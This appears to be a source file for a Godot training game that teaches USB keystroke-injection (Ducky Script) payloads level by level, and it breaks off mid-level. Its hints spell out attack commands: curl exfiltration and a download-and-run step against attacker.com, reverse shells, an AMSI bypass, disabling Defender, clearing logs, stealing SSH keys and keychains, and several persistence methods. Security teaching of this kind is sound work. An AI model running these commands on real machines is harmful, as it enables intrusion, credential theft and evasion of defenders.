extends Node

# ─── Static helpers ────────────────────────────────────────────────────────────

static func norm(code: String) -> String:
	return code.strip_edges().to_upper()

static func has_str(code: String, s: String) -> bool:
	return s.to_upper() in norm(code)

static func has_cmd(code: String, cmd: String) -> bool:
	var up_cmd := cmd.to_upper()
	for raw_line in code.split("\n"):
		var line := raw_line.strip_edges().to_upper()
		if line == up_cmd or line.begins_with(up_cmd + " ") or line.begins_with(up_cmd + "\t"):
			return true
	return false

static func regex_match(code: String, pattern: String) -> bool:
	var re := RegEx.new()
	if re.compile(pattern) != OK:
		return false
	return re.search(code.to_upper()) != null

# ─── Sections ─────────────────────────────────────────────────────────────────

const SECTIONS: Array = [
	{"start": 1,   "end": 10,  "name": "BASICS",       "color_hex": "#33ff88"},
	{"start": 11,  "end": 20,  "name": "WIN RECON",     "color_hex": "#44ddff"},
	{"start": 21,  "end": 30,  "name": "POWERSHELL",    "color_hex": "#88aaff"},
	{"start": 31,  "end": 40,  "name": "PERSISTENCE",   "color_hex": "#ff88cc"},
	{"start": 41,  "end": 50,  "name": "NETWORK OPS",   "color_hex": "#ffcc44"},
	{"start": 51,  "end": 60,  "name": "EVASION",       "color_hex": "#ff6644"},
	{"start": 61,  "end": 70,  "name": "LINUX",         "color_hex": "#aaff44"},
	{"start": 71,  "end": 80,  "name": "MACOS",         "color_hex": "#ff9944"},
	{"start": 81,  "end": 90,  "name": "MULTI-STAGE",   "color_hex": "#ff4466"},
	{"start": 91,  "end": 99,  "name": "ADVANCED OPS",  "color_hex": "#cc44ff"},
	{"start": 100, "end": 100, "name": "BOSS LEVEL",    "color_hex": "#ffdd00"},
]

const RANKS: Array = [
	"RECRUIT", "PRIVATE", "PRIVATE FC", "CORPORAL", "SERGEANT",
	"STAFF SGT", "SGT FIRST CLASS", "MASTER SGT", "FIRST SGT",
	"SERGEANT MAJOR", "WARRANT OFFICER", "CW2", "CW3", "CW4", "CW5",
	"2ND LIEUTENANT", "1ST LIEUTENANT", "CAPTAIN", "MAJOR",
	"LT COLONEL", "COLONEL", "BRIGADIER GEN", "MAJOR GEN",
	"LT GENERAL", "GENERAL", "GENERAL OF THE ARMY", "DUCK COMMANDER"
]

# ─── Level array ───────────────────────────────────────────────────────────────

var levels: Array = []

func _ready() -> void:
	_build_levels()

func _build_levels() -> void:
	levels = [
		# ── BASICS (1-10) ────────────────────────────────────────────────────────
		{
			"id": 1, "xp": 100,
			"title": "Hello, Duck World",
			"desc": "The first rule of Ducky Script: the STRING command types text on the target machine. Your mission is to type the classic Hello, World! message.",
			"hint": "Use: STRING Hello, World!\nMake sure your payload contains both HELLO and WORLD in a STRING command.",
			"success_msg": "Quack! Your first payload is live. The Duck has spoken!",
			"keywords": ["STRING", "HELLO", "WORLD"]
		},
		{
			"id": 2, "xp": 100,
			"title": "Press ENTER",
			"desc": "Typing text is useless without submitting it. Open Notepad by typing its name and pressing ENTER to launch it.",
			"hint": "Use: STRING notepad\nENTER",
			"success_msg": "Notepad launched! You're learning fast, Duck.",
			"keywords": ["STRING", "ENTER", "NOTEPAD"]
		},
		{
			"id": 3, "xp": 100,
			"title": "Add a Delay",
			"desc": "Timing is everything. The target machine needs a moment to catch up after actions. Use DELAY to pause execution before typing.",
			"hint": "Use: DELAY 1000\nSTRING hello",
			"success_msg": "Timing mastered! Patience is a hacker's virtue.",
			"keywords": ["DELAY", "STRING", "HELLO"]
		},
		{
			"id": 4, "xp": 110,
			"title": "Open Run Dialog",
			"desc": "The Windows Run dialog (Win+R) is a hacker's best friend. Use GUI R to open it, type notepad, and press ENTER.",
			"hint": "Use: GUI R\nDELAY 500\nSTRING notepad\nENTER",
			"success_msg": "Run dialog mastered! GUI keys unlock the kingdom.",
			"keywords": ["GUI R", "NOTEPAD", "ENTER"]
		},
		{
			"id": 5, "xp": 100,
			"title": "Add Comments",
			"desc": "Good payloads need documentation. REM is the comment command in Ducky Script - it does nothing but makes your code readable.",
			"hint": "Use: REM This is my payload\nSTRING Hello",
			"success_msg": "Commented and documented! A true professional hacker.",
			"keywords": ["REM", "STRING"]
		},
		{
			"id": 6, "xp": 110,
			"title": "Modifier Keys",
			"desc": "Ducky Script can send any keyboard combination. Use ALT F4 to close the active window on the target machine.",
			"hint": "Use: ALT F4",
			"success_msg": "Window closed! Modifier key combos give you full keyboard control.",
			"keywords": ["ALT F4"]
		},
		{
			"id": 7, "xp": 110,
			"title": "Copy and Paste",
			"desc": "Control key combinations are essential. Write a payload that selects all text (CTRL A) then copies it (CTRL C).",
			"hint": "Use: CTRL A\nCTRL C",
			"success_msg": "Clipboard hijacked! Copy-paste attacks are surprisingly effective.",
			"keywords": ["CTRL A", "CTRL C"]
		},
		{
			"id": 8, "xp": 100,
			"title": "Function Keys",
			"desc": "Function keys trigger special actions in many applications. Press F5 to refresh or trigger a function key action.",
			"hint": "Use: F5",
			"success_msg": "F5 deployed! Function keys are often overlooked attack vectors.",
			"keywords": ["F5"]
		},
		{
			"id": 9, "xp": 100,
			"title": "Arrow Keys",
			"desc": "Navigate menus and text with arrow keys. Press DOWNARROW at least 3 times to navigate through options.",
			"hint": "Use DOWNARROW three or more times:\nDOWNARROW\nDOWNARROW\nDOWNARROW",
			"success_msg": "Navigation complete! Arrow keys let you traverse any UI.",
			"keywords": ["DOWNARROW"]
		},
		{
			"id": 10, "xp": 120,
			"title": "Tab Key",
			"desc": "The TAB key moves focus between form fields. Use it to fill a login form: type admin, press TAB to move to password, then type password123 and ENTER.",
			"hint": "Use: STRING admin\nTAB\nSTRING password123\nENTER",
			"success_msg": "Login form filled! TAB-based form filling is classic Ducky technique.",
			"keywords": ["STRING", "TAB", "ENTER"]
		},
		# ── WIN RECON (11-20) ────────────────────────────────────────────────────
		{
			"id": 11, "xp": 120,
			"title": "Open Command Prompt",
			"desc": "Time to get serious. Open CMD via the Run dialog (GUI R, type cmd, ENTER). The command prompt is your primary recon tool on Windows.",
			"hint": "Use: GUI R\nDELAY 500\nSTRING cmd\nENTER",
			"success_msg": "CMD opened! The command prompt is your gateway to Windows internals.",
			"keywords": ["GUI R", "CMD", "ENTER"]
		},
		{
			"id": 12, "xp": 130,
			"title": "Who Am I?",
			"desc": "First thing in any compromise: identify the current user. Open CMD and run the whoami command.",
			"hint": "GUI R\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING whoami\nENTER",
			"success_msg": "Identity confirmed! Knowing your privilege level shapes your entire attack path.",
			"keywords": ["GUI R", "CMD", "WHOAMI"]
		},
		{
			"id": 13, "xp": 130,
			"title": "Network Recon",
			"desc": "Map the network! Use ipconfig in CMD to enumerate all network interfaces, IP addresses, and gateway information.",
			"hint": "Open CMD then type: STRING ipconfig\nENTER",
			"success_msg": "Network mapped! ipconfig is your first step in understanding the local network.",
			"keywords": ["CMD", "IPCONFIG"]
		},
		{
			"id": 14, "xp": 140,
			"title": "System Info Dump",
			"desc": "Gather complete system information using systeminfo. This reveals OS version, hotfixes, domain membership, and hardware details.",
			"hint": "Open CMD then: STRING systeminfo\nENTER",
			"success_msg": "System profiled! systeminfo reveals patch gaps and domain membership.",
			"keywords": ["CMD", "SYSTEMINFO"]
		},
		{
			"id": 15, "xp": 140,
			"title": "Process Enumeration",
			"desc": "See what's running on the target. Use tasklist in CMD to enumerate all running processes and their PIDs.",
			"hint": "Open CMD then: STRING tasklist\nENTER",
			"success_msg": "Processes enumerated! Knowing what's running helps identify AV and security tools.",
			"keywords": ["CMD", "TASKLIST"]
		},
		{
			"id": 16, "xp": 150,
			"title": "Active Connections",
			"desc": "See all active network connections and listening ports. Use netstat -an in CMD to reveal connections and identify C2 communications.",
			"hint": "Open CMD then: STRING netstat -an\nENTER",
			"success_msg": "Connections mapped! netstat reveals who the machine is talking to.",
			"keywords": ["CMD", "NETSTAT", "-AN"]
		},
		{
			"id": 17, "xp": 150,
			"title": "User Directory Listing",
			"desc": "Enumerate user accounts on the system. Use dir on the Users folder to reveal all accounts on the machine.",
			"hint": "Open CMD then: STRING dir C:\\Users\nENTER",
			"success_msg": "Users listed! Enumerating accounts helps identify high-value targets.",
			"keywords": ["CMD", "DIR", "USERS"]
		},
		{
			"id": 18, "xp": 150,
			"title": "Environment Variables",
			"desc": "Environment variables store sensitive paths and configuration. Use the SET command in CMD to dump all environment variables.",
			"hint": "Open CMD then: STRING set\nENTER",
			"success_msg": "Environment leaked! Variables often reveal credentials and sensitive paths.",
			"keywords": ["CMD", "SET"]
		},
		{
			"id": 19, "xp": 155,
			"title": "Scheduled Tasks",
			"desc": "Scheduled tasks can persist malware and reveal existing automation. Use schtasks /query to list all scheduled tasks.",
			"hint": "Open CMD then: STRING schtasks /query\nENTER",
			"success_msg": "Tasks enumerated! Scheduled tasks are prime real estate for persistence.",
			"keywords": ["SCHTASKS", "QUERY"]
		},
		{
			"id": 20, "xp": 160,
			"title": "ARP Cache",
			"desc": "The ARP cache reveals recently contacted IP-to-MAC mappings. Use arp -a in CMD to map the local network neighborhood.",
			"hint": "Open CMD then: STRING arp -a\nENTER",
			"success_msg": "ARP cache dumped! MAC addresses reveal device types and network topology.",
			"keywords": ["CMD", "ARP", "-A"]
		},
		# ── POWERSHELL (21-30) ───────────────────────────────────────────────────
		{
			"id": 21, "xp": 160,
			"title": "Launch PowerShell",
			"desc": "PowerShell is the modern hacker's shell. Use GUI R, type powershell, and press ENTER to open a PowerShell window.",
			"hint": "GUI R\nDELAY 500\nSTRING powershell\nENTER",
			"success_msg": "PowerShell launched! You've upgraded from CMD to a full scripting engine.",
			"keywords": ["GUI R", "POWERSHELL", "ENTER"]
		},
		{
			"id": 22, "xp": 170,
			"title": "PS: Current User",
			"desc": "In PowerShell, get the current username with $env:USERNAME and display it with Write-Host.",
			"hint": "Open PowerShell then: STRING Write-Host $env:USERNAME\nENTER",
			"success_msg": "Username retrieved! PowerShell's environment variables are more accessible than CMD.",
			"keywords": ["POWERSHELL", "USERNAME", "WRITE-HOST"]
		},
		{
			"id": 23, "xp": 180,
			"title": "Bypass Execution Policy",
			"desc": "Windows blocks PowerShell scripts by default. Bypass the ExecutionPolicy restriction to enable script execution.",
			"hint": "STRING powershell -ExecutionPolicy Bypass\nENTER",
			"success_msg": "Policy bypassed! ExecutionPolicy is a speed bump, not a wall.",
			"keywords": ["POWERSHELL", "EXECUTIONPOLICY", "BYPASS"]
		},
		{
			"id": 24, "xp": 190,
			"title": "Service Enumeration",
			"desc": "Enumerate running services to find vulnerable or misconfigured services. Use Get-Service in PowerShell.",
			"hint": "In PowerShell: STRING Get-Service\nENTER",
			"success_msg": "Services mapped! Vulnerable services are common privilege escalation paths.",
			"keywords": ["POWERSHELL", "GET-SERVICE"]
		},
		{
			"id": 25, "xp": 200,
			"title": "Download a File",
			"desc": "Download files from a remote server using PowerShell's Invoke-WebRequest (or iwr / wget alias).",
			"hint": "STRING Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\p.exe\nENTER",
			"success_msg": "File downloaded! Remote file delivery is the backbone of staged payloads.",
			"keywords": ["POWERSHELL", "INVOKE-WEBREQUEST"]
		},
		{
			"id": 26, "xp": 210,
			"title": "Encoded Command",
			"desc": "Encode your PowerShell command in Base64 to evade signature-based detection. Use -EncodedCommand (or -Enc).",
			"hint": "STRING powershell -EncodedCommand <base64>\nENTER",
			"success_msg": "Encoded command deployed! Base64 encoding defeats many naive AV signatures.",
			"keywords": ["POWERSHELL", "-ENCODEDCOMMAND"]
		},
		{
			"id": 27, "xp": 210,
			"title": "Process Recon",
			"desc": "Use PowerShell's Get-Process to enumerate all running processes with more detail than tasklist.",
			"hint": "In PowerShell: STRING Get-Process\nENTER",
			"success_msg": "Processes enumerated! Get-Process gives richer data than CMD's tasklist.",
			"keywords": ["POWERSHELL", "GET-PROCESS"]
		},
		{
			"id": 28, "xp": 220,
			"title": "Registry Run Keys",
			"desc": "The HKCU Run registry key auto-starts programs at login. Use Get-ItemProperty to read existing run-key entries.",
			"hint": "STRING Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nENTER",
			"success_msg": "Run keys read! Registry persistence is stealthy and effective.",
			"keywords": ["POWERSHELL", "GET-ITEMPROPERTY", "RUN"]
		},
		{
			"id": 29, "xp": 230,
			"title": "Create a File",
			"desc": "Drop a file on the target using PowerShell's New-Item. Create a file called duck.txt as proof of presence.",
			"hint": "STRING New-Item -Path C:\\temp\\duck.txt -ItemType File\nENTER",
			"success_msg": "File created! Leaving artifacts is messy - but sometimes intentional.",
			"keywords": ["POWERSHELL", "NEW-ITEM", "DUCK"]
		},
		{
			"id": 30, "xp": 250,
			"title": "TCP Connect Test",
			"desc": "Test connectivity to your C2 server using PowerShell's TcpClient. Connect to 192.168.1.100 to verify reachability.",
			"hint": "STRING $c = New-Object System.Net.Sockets.TcpClient; $c.Connect('192.168.1.100', 4444)\nENTER",
			"success_msg": "C2 reachable! TCP connectivity test is a critical pre-exploitation check.",
			"keywords": ["POWERSHELL", "TCPCLIENT", "192.168.1.100"]
		},
		# ── PERSISTENCE (31-40) ──────────────────────────────────────────────────
		{
			"id": 31, "xp": 210,
			"title": "Startup Folder",
			"desc": "The Windows Startup folder runs programs at every login. Open it via shell:startup in the Run dialog to drop a payload.",
			"hint": "GUI R\nDELAY 500\nSTRING shell:startup\nENTER",
			"success_msg": "Startup folder opened! Items here execute silently at every login.",
			"keywords": ["GUI R", "SHELL:STARTUP"]
		},
		{
			"id": 32, "xp": 220,
			"title": "Registry Persistence",
			"desc": "Add a registry Run key to auto-execute your duck payload at every Windows login using reg add.",
			"hint": "STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v duck /d C:\\duck.exe /f\nENTER",
			"success_msg": "Registry key planted! Silent boot persistence established.",
			"keywords": ["REG ADD", "RUN", "DUCK"]
		},
		{
			"id": 33, "xp": 230,
			"title": "Scheduled Task Persistence",
			"desc": "Create a scheduled task called DUCKTASK that runs your payload automatically using schtasks /create.",
			"hint": "STRING schtasks /create /tn DUCKTASK /tr C:\\duck.exe /sc onlogon /f\nENTER",
			"success_msg": "Scheduled task created! Tasks survive reboots and run under user or SYSTEM context.",
			"keywords": ["SCHTASKS", "/CREATE", "DUCKTASK"]
		},
		{
			"id": 34, "xp": 240,
			"title": "WMI Event Subscription",
			"desc": "WMI Event Subscriptions provide fileless persistence. Use PowerShell to create an EventFilter or InstanceCreationEvent subscription.",
			"hint": "STRING $filter = Set-WMIInstance -Class __EventFilter -Namespace root\\subscription\nENTER",
			"success_msg": "WMI subscription created! This persistence method lives entirely in the WMI database.",
			"keywords": ["POWERSHELL", "WMI"]
		},
		{
			"id": 35, "xp": 240,
			"title": "LNK File Shortcut",
			"desc": "Create a malicious .lnk shortcut using WScript.Shell's CreateShortcut method to persist in a visible-but-innocent way.",
			"hint": "STRING $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('C:\\duck.lnk'); $s.Save()\nENTER",
			"success_msg": "Shortcut created! LNK files are a classic social engineering and persistence tool.",
			"keywords": ["POWERSHELL", "CREATESHORTCUT", ".LNK"]
		},
		{
			"id": 36, "xp": 245,
			"title": "BITS Job Persistence",
			"desc": "Background Intelligent Transfer Service (BITS) can run commands on job completion. Create a BITS job called DUCKJOB for persistence.",
			"hint": "STRING bitsadmin /create DUCKJOB\nbitsadmin /SetNotifyCmdLine DUCKJOB C:\\duck.exe NULL\nENTER",
			"success_msg": "BITS job planted! BITS persistence survives reboots and runs as SYSTEM.",
			"keywords": ["BITSADMIN", "DUCKJOB"]
		},
		{
			"id": 37, "xp": 250,
			"title": "DLL Hijacking",
			"desc": "DLL hijacking places a malicious DLL where Windows will load it instead of the legitimate one. Target a writable directory in Program Files.",
			"hint": "STRING copy evil.dll \"C:\\Program Files\\VulnApp\\version.dll\"\nENTER",
			"success_msg": "DLL planted! When VulnApp launches, it loads your DLL instead of the real one.",
			"keywords": ["VERSION.DLL"]
		},
		{
			"id": 38, "xp": 255,
			"title": "Malicious Service",
			"desc": "Create a Windows service called DUCKSVC that auto-starts your payload with SYSTEM privileges using sc create.",
			"hint": "STRING sc create DUCKSVC binpath= C:\\duck.exe start= auto\nENTER",
			"success_msg": "Service registered! Services run as SYSTEM and restart automatically.",
			"keywords": ["SC CREATE", "DUCKSVC"]
		},
		{
			"id": 39, "xp": 260,
			"title": "Disable Windows Defender",
			"desc": "Disable Windows Defender's real-time monitoring using PowerShell's Set-MpPreference with DisableRealtimeMonitoring.",
			"hint": "STRING Set-MpPreference -DisableRealtimeMonitoring $true\nENTER",
			"success_msg": "Defender disabled! AV removal is often the first step before dropping additional payloads.",
			"keywords": ["POWERSHELL", "SET-MPPREFERENCE", "DISABLEREALTIMEMONITORING"]
		},
		{
			"id": 40, "xp": 280,
			"title": "Firewall Rule for C2",
			"desc": "Add a Windows Firewall rule allowing outbound C2 traffic to DUCKC2 on port 4444 using netsh advfirewall.",
			"hint": "STRING netsh advfirewall firewall add rule name=DUCKC2 dir=out action=allow protocol=TCP remoteport=4444\nENTER",
			"success_msg": "Firewall rule added! Your C2 channel is now officially blessed by Windows.",
			"keywords": ["ADVFIREWALL", "DUCKC2", "4444"]
		},
		# ── NETWORK OPS (41-50) ──────────────────────────────────────────────────
		{
			"id": 41, "xp": 170,
			"title": "Ping Test",
			"desc": "Test basic internet connectivity by pinging Google's DNS server 8.8.8.8 from CMD.",
			"hint": "Open CMD then: STRING ping 8.8.8.8\nENTER",
			"success_msg": "Network reachable! Ping is the first connectivity diagnostic in any operation.",
			"keywords": ["CMD", "PING", "8.8.8.8"]
		},
		{
			"id": 42, "xp": 180,
			"title": "Trace the Route",
			"desc": "Trace the network path to google.com using tracert to map intermediate hops and identify network segments.",
			"hint": "Open CMD then: STRING tracert google.com\nENTER",
			"success_msg": "Route traced! Tracert reveals network topology and potential pivot points.",
			"keywords": ["TRACERT", "GOOGLE"]
		},
		{
			"id": 43, "xp": 190,
			"title": "DNS Lookup",
			"desc": "Resolve target.com's DNS records using nslookup to find IP addresses, MX records, and name servers.",
			"hint": "Open CMD then: STRING nslookup target.com\nENTER",
			"success_msg": "DNS resolved! Name server information can reveal hosting providers and infrastructure.",
			"keywords": ["NSLOOKUP", "TARGET.COM"]
		},
		{
			"id": 44, "xp": 195,
			"title": "Network Shares",
			"desc": "Enumerate all network shares visible from this machine using net view /all. Open shares are often goldmines of sensitive data.",
			"hint": "Open CMD then: STRING net view /all\nENTER",
			"success_msg": "Shares enumerated! Unprotected network shares are common data exfiltration paths.",
			"keywords": ["NET VIEW", "/ALL"]
		},
		{
			"id": 45, "xp": 200,
			"title": "Mount Network Drive",
			"desc": "Map a network share to drive letter Z: using net use. Target the 192.168.1 subnet.",
			"hint": "STRING net use Z: \\\\192.168.1.1\\share\nENTER",
			"success_msg": "Drive mounted! Mapped drives give transparent access to remote file systems.",
			"keywords": ["NET USE", "Z:", "192.168.1"]
		},
		{
			"id": 46, "xp": 205,
			"title": "Port Connectivity Test",
			"desc": "Test if port 80 is open on the gateway 192.168.1.1 using PowerShell's Test-NetConnection.",
			"hint": "STRING Test-NetConnection -ComputerName 192.168.1.1 -Port 80\nENTER",
			"success_msg": "Port scan complete! Test-NetConnection is PowerShell's built-in port checker.",
			"keywords": ["POWERSHELL", "TEST-NETCONNECTION", "192.168.1.1"]
		},
		{
			"id": 47, "xp": 215,
			"title": "Data Exfiltration",
			"desc": "Exfiltrate data by POSTing it to your attacker server at attacker.com using curl.",
			"hint": "STRING curl -X POST -d @C:\\loot.txt http://attacker.com/receive\nENTER",
			"success_msg": "Data exfiltrated! HTTP POST exfiltration blends into normal web traffic.",
			"keywords": ["CURL", "POST", "ATTACKER.COM"]
		},
		{
			"id": 48, "xp": 220,
			"title": "DNS Exfiltration Recon",
			"desc": "Set up DNS-based communication by using nslookup to query your attacker domain. DNS queries bypass many firewalls.",
			"hint": "STRING nslookup attacker.com\nENTER",
			"success_msg": "DNS channel tested! DNS exfiltration encodes data in lookup queries.",
			"keywords": ["NSLOOKUP", "ATTACKER.COM"]
		},
		{
			"id": 49, "xp": 235,
			"title": "Reverse Shell Setup",
			"desc": "Establish a reverse shell connecting back to your C2 on port 9001 using PowerShell's TcpClient.",
			"hint": "STRING $c=New-Object System.Net.Sockets.TcpClient; $c.Connect('attacker.com',9001)\nENTER",
			"success_msg": "Reverse shell initiated! Outbound connections defeat most inbound firewall rules.",
			"keywords": ["POWERSHELL", "TCPCLIENT", "9001"]
		},
		{
			"id": 50, "xp": 260,
			"title": "WiFi Profile Dump",
			"desc": "Dump saved WiFi credentials using netsh wlan show profiles. Saved networks often reveal passwords in plain text.",
			"hint": "STRING netsh wlan show profiles\nENTER",
			"success_msg": "WiFi profiles dumped! Cleartext WiFi passwords are a bonus in every engagement.",
			"keywords": ["NETSH WLAN", "PROFILES"]
		},
		# ── EVASION (51-60) ──────────────────────────────────────────────────────
		{
			"id": 51, "xp": 220,
			"title": "Timing Evasion",
			"desc": "Use at least 3 different DELAY values to create irregular timing patterns that defeat behavioral analysis.",
			"hint": "Use varied delays like:\nDELAY 200\nSTRING cmd\nDELAY 750\nENTER\nDELAY 1500\nSTRING whoami",
			"success_msg": "Timing randomized! Irregular delays defeat time-based behavioral detection.",
			"keywords": ["DELAY", "TIMING", "EVASION"]
		},
		{
			"id": 52, "xp": 230,
			"title": "Certutil Encoding",
			"desc": "Use certutil's -encode or -decode to encode/decode your payload, abusing a built-in Windows tool for obfuscation.",
			"hint": "STRING certutil -encode C:\\payload.exe C:\\payload.b64\nENTER",
			"success_msg": "Payload encoded! Living-off-the-land with certutil bypasses application whitelisting.",
			"keywords": ["CERTUTIL", "-ENCODE"]
		},
		{
			"id": 53, "xp": 240,
			"title": "AMSI Bypass",
			"desc": "The Anti-Malware Scan Interface (AMSI) intercepts PowerShell. Patch it in memory to disable scanning before running your payload.",
			"hint": "STRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nENTER",
			"success_msg": "AMSI patched! With AMSI blind, PowerShell payloads run without inline scanning.",
			"keywords": ["POWERSHELL", "AMSI"]
		},
		{
			"id": 54, "xp": 250,
			"title": "IEX Download Cradle",
			"desc": "Invoke-Expression (IEX) combined with DownloadString executes remote scripts in memory without touching disk.",
			"hint": "STRING IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\nENTER",
			"success_msg": "In-memory execution! No file on disk means no file-based AV detection.",
			"keywords": ["POWERSHELL", "IEX"]
		},
		{
			"id": 55, "xp": 255,
			"title": "Alternate Data Streams",
			"desc": "NTFS Alternate Data Streams (ADS) hide data in file metadata. Store your payload in a .txt file's hidden stream.",
			"hint": "STRING echo malware > innocent.txt:hidden\nENTER\nSTRING cmd /r innocent.txt:hidden",
			"success_msg": "ADS exploited! Hidden streams are invisible to dir but fully executable.",
			"keywords": [".TXT:", "ECHO"]
		},
		{
			"id": 56, "xp": 260,
			"title": "Clear Security Logs",
			"desc": "Erase your tracks by clearing the Windows Security event log using wevtutil cl security.",
			"hint": "STRING wevtutil cl Security\nENTER",
			"success_msg": "Logs cleared! Evidence destroyed. This is why IR teams check backup logs.",
			"keywords": ["WEVTUTIL", "CL", "SECURITY"]
		},
		{
			"id": 57, "xp": 270,
			"title": "Timestamp Manipulation",
			"desc": "Alter file timestamps using PowerShell's LastWriteTime and AddYears to make malicious files appear old and legitimate.",
			"hint": "STRING (Get-Item C:\\duck.exe).LastWriteTime = (Get-Date).AddYears(-3)\nENTER",
			"success_msg": "Timestamps forged! Backdated files blend in with legitimate system files.",
			"keywords": ["POWERSHELL", "LASTWRITETIME", "ADDYEARS"]
		},
		{
			"id": 58, "xp": 280,
			"title": "Process Injection Prep",
			"desc": "Launch a process in hidden or suspended state using PowerShell's Start-Process with WindowStyle Hidden or Suspended.",
			"hint": "STRING Start-Process calc.exe -WindowStyle Hidden\nENTER",
			"success_msg": "Hidden process launched! Suspended processes can be injected with shellcode.",
			"keywords": ["POWERSHELL", "START-PROCESS", "HIDDEN"]
		},
		{
			"id": 59, "xp": 290,
			"title": "UAC Bypass",
			"desc": "Bypass UAC using the fodhelper registry trick: add MS-SETTINGS to the registry to make cmd.exe execute with elevated privileges.",
			"hint": "STRING reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d cmd.exe /f\nENTER",
			"success_msg": "UAC bypassed! The fodhelper trick abuses COM object trust to elevate without prompts.",
			"keywords": ["REG ADD", "MS-SETTINGS", "CMD.EXE"]
		},
		{
			"id": 60, "xp": 300,
			"title": "Self-Destruct",
			"desc": "A professional payload removes itself after execution. Use DEL %0 in a batch script or Remove-Item $MyInvocation to self-delete.",
			"hint": "At the end of your payload: STRING del %0\nENTER\nor use: STRING Remove-Item $MyInvocation.MyCommand.Path",
			"success_msg": "Payload self-destructed! Leaving no traces is the mark of an elite operator.",
			"keywords": ["DEL %0", "SELF-DELETE"]
		},
		# ── LINUX (61-70) ────────────────────────────────────────────────────────
		{
			"id": 61, "xp": 160,
			"title": "Open Linux Terminal",
			"desc": "On a Linux desktop, open the terminal with CTRL+ALT+T. This is the universal shortcut across most distros.",
			"hint": "Use: CTRL ALT T",
			"success_msg": "Terminal opened! CTRL+ALT+T is your Linux gateway.",
			"keywords": ["CTRL ALT T"]
		},
		{
			"id": 62, "xp": 170,
			"title": "Linux: Identify User",
			"desc": "Open a Linux terminal and type id to see the current user, UID, GID, and group memberships.",
			"hint": "CTRL ALT T\nDELAY 1000\nSTRING id\nENTER",
			"success_msg": "Linux identity revealed! UID 0 means you're root - the ultimate goal.",
			"keywords": ["CTRL ALT T", "STRING ID"]
		},
		{
			"id": 63, "xp": 180,
			"title": "Linux Directory Listing",
			"desc": "List all files including hidden ones in /home with ls -la /home to enumerate user home directories.",
			"hint": "STRING ls -la /home\nENTER",
			"success_msg": "Home directories enumerated! .ssh folders and bash_history are valuable targets.",
			"keywords": ["LS", "-LA", "/HOME"]
		},
		{
			"id": 64, "xp": 190,
			"title": "SSH Key Theft",
			"desc": "Private SSH keys in ~/.ssh/id_rsa provide passwordless access to remote servers. Use cat to read them.",
			"hint": "STRING cat ~/.ssh/id_rsa\nENTER",
			"success_msg": "SSH key exfiltrated! Private keys give durable access to all linked servers.",
			"keywords": ["CAT", "SSH", "ID_RSA"]
		},
		{
			"id": 65, "xp": 200,
			"title": "Cron Persistence",
			"desc": "Add a cron job to run your duck payload on a schedule using crontab. Cron persistence survives reboots.",
			"hint": "STRING crontab -e\nDELAY 500\nSTRING * * * * * /tmp/duck.sh",
			"success_msg": "Cron job planted! Persistent execution on Linux without touching systemd.",
			"keywords": ["CRONTAB", "* * * *"]
		},
		{
			"id": 66, "xp": 210,
			"title": "SUID Hunting",
			"desc": "Find SUID binaries with find -perm 4000. SUID programs run with their owner's permissions, enabling privilege escalation.",
			"hint": "STRING find / -perm -4000 -type f 2>/dev/null\nENTER",
			"success_msg": "SUID binaries found! These are often escalation paths to root.",
			"keywords": ["FIND", "-PERM", "4000"]
		},
		{
			"id": 67, "xp": 220,
			"title": "Passwd File",
			"desc": "Read /etc/passwd to enumerate all user accounts, UIDs, and shell types on the Linux system.",
			"hint": "STRING cat /etc/passwd\nENTER",
			"success_msg": "/etc/passwd read! Combined with /etc/shadow, you can crack password hashes offline.",
			"keywords": ["CAT", "/ETC/PASSWD"]
		},
		{
			"id": 68, "xp": 240,
			"title": "Netcat Listener",
			"desc": "Set up a netcat listener on port 4444 to receive a reverse shell connection using nc -lvnp.",
			"hint": "STRING nc -lvnp 4444\nENTER",
			"success_msg": "Listener up! Netcat is the Swiss army knife of network connections.",
			"keywords": ["NC", "4444", "LVNP"]
		},
		{
			"id": 69, "xp": 255,
			"title": "Bash Reverse Shell",
			"desc": "Send a bash reverse shell using /dev/tcp to connect back to 192.168.1.100.",
			"hint": "STRING bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\nENTER",
			"success_msg": "Bash reverse shell sent! /dev/tcp is a bash built-in requiring no external tools.",
			"keywords": ["BASH", "/DEV/TCP/", "192.168.1.100"]
		},
		{
			"id": 70, "xp": 270,
			"title": "Sudo Rights Check",
			"desc": "Check what commands the current user can run as root using sudo -l. Misconfigurations here lead directly to root.",
			"hint": "STRING sudo -l\nENTER",
			"success_msg": "Sudo rights enumerated! sudo -l is always the first privesc check on Linux.",
			"keywords": ["SUDO", "-L"]
		},
		# ── MACOS (71-80) ────────────────────────────────────────────────────────
		{
			"id": 71, "xp": 170,
			"title": "Open macOS Terminal",
			"desc": "Open Spotlight (GUI+Space) and search for Terminal to open a macOS shell.",
			"hint": "GUI SPACE\nDELAY 500\nSTRING Terminal\nENTER",
			"success_msg": "macOS terminal opened! Spotlight is the fastest launcher on macOS.",
			"keywords": ["GUI SPACE", "TERMINAL", "ENTER"]
		},
		{
			"id": 72, "xp": 180,
			"title": "macOS: Who Am I",
			"desc": "Open Spotlight terminal and run whoami and id to identify the current macOS user and group memberships.",
			"hint": "GUI SPACE\nDELAY 500\nSTRING Terminal\nENTER\nDELAY 1000\nSTRING whoami && id\nENTER",
			"success_msg": "macOS identity confirmed! Check if you're in the admin group for easy sudo.",
			"keywords": ["GUI SPACE", "WHOAMI", " ID"]
		},
		{
			"id": 73, "xp": 195,
			"title": "Keychain Dump",
			"desc": "macOS stores passwords in the Keychain. Use the security command with dump-keychain to extract stored credentials.",
			"hint": "STRING security dump-keychain -d ~/Library/Keychains/login.keychain-db\nENTER",
			"success_msg": "Keychain targeted! macOS Keychain stores WiFi, web, and app passwords.",
			"keywords": ["SECURITY", "DUMP-KEYCHAIN"]
		},
		{
			"id": 74, "xp": 210,
			"title": "LaunchAgent Persistence",
			"desc": "macOS LaunchAgents run at user login. Drop a .plist file in ~/Library/LaunchAgents for persistent execution.",
